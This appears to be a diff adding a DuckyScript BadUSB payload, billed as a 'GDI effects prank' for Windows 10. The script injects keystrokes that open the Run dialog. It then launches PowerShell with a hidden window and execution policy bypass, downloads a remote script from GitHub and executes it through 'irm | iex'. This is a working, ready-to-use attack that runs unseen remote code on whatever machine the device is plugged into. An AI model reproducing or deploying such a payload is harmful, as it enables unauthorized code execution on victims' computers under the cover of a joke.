@@ -1,0 +1,16 @@
+REM Title: beigeworm's GDI Effects Prank.
+REM Author: @beigeworm
+REM Description: This script uses GDI effects on the users display to create visual effects for 90 seconds.
+REM Target: Windows 10
+
+REM some setup for dukie script
+DEFAULT_DELAY 100
+
+REM open powershell (remove "-W H" to show the window)
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -NoP -Ep Bypass -W H -C irm https://raw.githubusercontent.com/beigeworm/BadUSB-Files-For-FlipperZero/main/Computer-Acid/main.ps1 | iex
+ENTER
+
+
